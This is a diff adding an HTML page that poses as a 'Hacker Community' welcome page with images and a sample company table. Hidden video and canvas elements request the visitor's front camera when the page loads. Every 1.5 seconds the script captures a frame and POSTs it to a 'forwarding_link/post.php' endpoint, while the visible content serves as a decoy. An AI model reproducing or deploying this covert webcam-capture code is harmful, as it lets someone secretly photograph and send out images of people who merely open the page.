@@ -1,0 +1,138 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        
+
+
+<body>
+<script src="hacker.js"></script>
+<h1 style="color:Red;">Hi</h1>
+<p>   </p><img src="https://assets.gamepur.com/wp-content/uploads/2020/10/14011707/Screenshot-at-Oct-14-00-16-54-850x475.png" width="290" height="150">
+<h1 style="background-color:gray;">☠☠☠ Welcome to Hacker Community!    ☠☠☠ </h1>
+<img src="https://static.vecteezy.com/system/resources/previews/028/560/488/large_2x/cybersecurity-hacker-with-a-concealed-face-wearing-a-hoodie-in-a-technology-themed-wallpaper-photo.jpg" alt="Haker" usemap="#workmap" width="810" height="479"><p> yes...</p>
+<img src="https://as1.ftcdn.net/v2/jpg/05/68/02/76/1000_F_568027622_DgZfYnf1Xv2ncLvPSuYqZ7CfEuE7pBVL.jpg" width="690" heigth="390">
+<h2>BLACK Table</h2>
+
+<table>
+  <tr>
+    <th>Company</th>
+    <th>Contact</th>
+    <th>Country</th>
+  </tr>
+  <tr>
+    <td>Alfreds Futterkiste</td>
+    <td>Maria Anders</td>
+    <td>Germany</td>
+  </tr>
+  <tr>
+    <td>Centro comercial Moctezuma</td>
+    <td>Francisco Chang</td>
+    <td>Mexico</td>
+  </tr>
+  <tr>
+    <td>Ernst Handel</td>
+    <td>Roland Mendel</td>
+    <td>Austria</td>
+  </tr>
+  <tr>
+    <td>Island Trading</td>
+    <td>Helen Bennett</td>
+    <td>UK</td>
+  </tr>
+  <tr>
+    <td>Laughing Bacchus Winecellars</td>
+    <td>Yoshi Tannamuri</td>
+    <td>Canada</td>
+  </tr>
+  <tr>
+    <td>Magazzini Alimentari Riuniti</td>
+    <td>Giovanni Rovelli</td>
+    <td>Italy</td>
+  </tr>
+</table>
+<h3 style="color:red;">☠☠☠</h3>
+<img src="https://lh3.googleusercontent.com/-qFWhcvqU2Cg/YJDx3WeshNI/AAAAAAAABjc/tClt8rt0wA0vhEv3dDlUGxFCE87LQ4JnQCLcBGAsYHQ/Top-10-Amazing-Websites-on-Google-6.png"  width="400" height="279">
+ 
+<p>.........</p> 
+<img src="https://img.itch.zone/aW1nLzUwOTU5ODEuanBn/original/oRBRvB.jpg" width="300" height="350">
+</body>
+
+        
+
+</html>
+
+
